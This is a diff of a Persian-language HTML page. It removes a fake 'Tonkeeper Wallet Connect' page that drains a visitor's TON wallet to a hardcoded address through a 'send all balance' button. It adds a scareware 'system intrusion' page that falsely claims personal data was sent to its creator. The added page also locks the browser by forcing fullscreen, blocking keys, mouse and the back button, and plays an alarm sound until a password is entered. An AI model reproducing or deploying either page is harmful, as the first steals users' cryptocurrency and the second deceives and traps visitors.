@@ -1,151 +1,104 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fa">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tonkeeper Wallet Connect</title>
-    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+    <title>نفوذ به سیستم</title>
     <style>
         body {
-            font-family: 'Arial', sans-serif;
-            text-align: center;
-            background-color: #f4f4f4;
-            padding: 20px;
-        }
-
-        .container {
-            max-width: 400px;
-            margin: auto;
-            background: white;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.1);
-        }
-
-        button {
-            background-color: #007bff;
-            color: white;
-            border: none;
-            padding: 12px;
-            width: 100%;
+            background-color: black;
+            color: lime;
+            font-family: monospace;
             font-size: 16px;
-            border-radius: 8px;
-            cursor: pointer;
-            margin-top: 10px;
+            padding: 20px;
+            overflow: hidden;
+            user-select: none;
+            text-align: center;
+            direction: rtl;
         }
-
-        button:hover {
-            background-color: #0056b3;
+        .warning {
+            color: red;
+            font-weight: bold;
+            text-align: center;
+            font-size: 24px;
+            margin-top: 20%;
         }
-
-        .wallet-info {
+        #passwordInput {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: black;
+            border: 1px solid lime;
+            color: lime;
+            font-size: 20px;
+            padding: 10px;
             display: none;
-            background: #f9f9f9;
-            padding: 15px;
-            border-radius: 8px;
-            margin-top: 10px;
         }
-
-        .wallet-info p {
-            margin: 5px 0;
-        }
-
     </style>
 </head>
-<body>
-
-    <div class="container">
-        <h2>اتصال به کیف پول</h2>
-        <button id="connect-wallet">اتصال به کیف پول</button>
-
-        <div id="wallet-info" class="wallet-info">
-            <p><strong>آدرس کیف پول:</strong> <span id="wallet-address"></span></p>
-            <p><strong>موجودی:</strong> <span id="wallet-balance"></span> TON</p>
-            <button id="send-all" style="display: none;">ارسال تمام موجودی</button>
-        </div>
+<body oncontextmenu="return false;" onkeydown="return disableKeys(event);">
+    <div id="terminal">اطلاعات شخصی شما برای سازنده ارسال شد.
     </div>
-
+    <input type="password" id="passwordInput" placeholder="رمز عبور را وارد کنید" onkeydown="checkPassword(event)">
     <script>
-        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-            manifestUrl: 'https://miladsoft.github.io/ton-connect/tonconnect-manifest.json',
-        });
+        const passwordInput = document.getElementById("passwordInput");
 
-        const connectWalletBtn = document.getElementById("connect-wallet");
-        const walletInfoDiv = document.getElementById("wallet-info");
-        const walletAddressSpan = document.getElementById("wallet-address");
-        const walletBalanceSpan = document.getElementById("wallet-balance");
-        const sendAllBtn = document.getElementById("send-all");
+        setTimeout(() => {
+            passwordInput.style.display = 'block';
+            passwordInput.focus();
+        }, 2000);
 
-        let userWalletAddress = "";
-        let userBalance = 0;
+        function disableMouse() {
+            document.onmousemove = function(event) {
+                event.preventDefault();
+            };
+            document.ontouchmove = function(event) {
+                event.preventDefault();
+            };
+        }
+        disableMouse();
 
-        // اتصال کیف پول
-        connectWalletBtn.addEventListener("click", async () => {
-            try {
-                // اتصال به کیف پول
-                const connectedWallet = await tonConnectUI.connectWallet();
-                userWalletAddress = connectedWallet.account.address;
-                walletAddressSpan.textContent = userWalletAddress;
-                
-                // نمایش اطلاعات کیف پول
-                walletInfoDiv.style.display = "block";
-
-                // دریافت موجودی Toncoin
-                const balanceResponse = await fetch(`https://tonapi.io/v2/accounts/${userWalletAddress}`);
-                const balanceData = await balanceResponse.json();
-                userBalance = balanceData.balance ? balanceData.balance / 1e9 : 0; // تبدیل nanotons به TON
-                
-                walletBalanceSpan.textContent = userBalance.toFixed(6); // نمایش ۶ رقم اعشار
-
-                // دریافت تمام موجودی‌های Jetton (توکن‌های دیگر)
-                // شما باید از API خاصی برای دریافت Jetton‌ها استفاده کنید
-                // در اینجا فقط فرض شده که موجودی Jetton‌ها را به‌طور دستی وارد می‌کنید
-                const jettonBalance = 5; // این مقدار فرضی است. باید با API واقعی جایگزین شود.
-
-                // جمع موجودی‌ها
-                const totalBalance = userBalance + jettonBalance;
-                walletBalanceSpan.textContent = totalBalance.toFixed(6); // نمایش موجودی کل
-
-                // نمایش دکمه ارسال تمام موجودی
-                sendAllBtn.style.display = "block";
-
-            } catch (error) {
-                alert("خطا در اتصال به کیف پول");
-                console.error(error);
+        function disableKeys(event) {
+            if ([116, 123, 27, 17, 18, 91].includes(event.keyCode) || (event.ctrlKey && [73, 85, 87, 83, 68].includes(event.keyCode))) {
+                event.preventDefault();
+                event.stopPropagation();
+                return false;
             }
+        }
+        
+        function goFullscreen() {
+            if (document.documentElement.requestFullscreen) {
+                document.documentElement.requestFullscreen();
+            } else if (document.documentElement.mozRequestFullScreen) {
+                document.documentElement.mozRequestFullScreen();
+            } else if (document.documentElement.webkitRequestFullscreen) {
+                document.documentElement.webkitRequestFullscreen();
+            } else if (document.documentElement.msRequestFullscreen) {
+                document.documentElement.msRequestFullscreen();
+            }
+        }
+        
+        setTimeout(goFullscreen, 500);
+        
+        window.history.pushState(null, null, document.URL);
+        window.addEventListener('popstate', function () {
+            window.history.pushState(null, null, document.URL);
         });
-
-        // ارسال تمام موجودی به جز کارمزد تخمینی
-        sendAllBtn.addEventListener("click", async () => {
-            try {
-                // دریافت مقدار تخمینی کارمزد از API
-                const gasFeeEstimate = 0.1; // حدودی (میتوان مقدار دقیق را از API دریافت کرد)
-                const sendAmount = userBalance + 5 - gasFeeEstimate; // Jetton‌ها را به موجودی اضافه می‌کنیم
-
-                if (sendAmount <= 0) {
-                    alert("موجودی کافی نیست! حداقل مقدار برای پرداخت کارمزد باید باقی بماند.");
-                    return;
+        
+        let audio = new Audio('https://www.myinstants.com/media/sounds/windows-xp-error.mp3');
+        setTimeout(() => { audio.play(); }, 1000);
+        
+        function checkPassword(event) {
+            if (event.key === 'Enter') {
+                if (passwordInput.value === '1111') {
+                    alert('سیستم بازیابی شد!');
+                    location.reload();
+                } else {
+                    alert('رمز عبور نادرست است!');
                 }
-
-                const transaction = {
-                    messages: [
-                        {
-                            address: "UQDhw1z4-qGN-mEKA3ukAHRkqOmZnyeC8pYqo-nWJKalUtLW", // آدرس مقصد
-                            amount: (sendAmount * 1e9).toString(), // تبدیل TON به nanotons
-                        },
-                    ],
-                };
-
-                const result = await tonConnectUI.sendTransaction(transaction);
-                alert(`ارسال ${sendAmount.toFixed(6)} TON انجام شد!`);
-                console.log("Transaction Result:", result);
-
-            } catch (error) {
-                alert("ارسال تراکنش ناموفق بود.");
-                console.error(error);
             }
-        });
+        }
     </script>
-
 </body>
 </html>
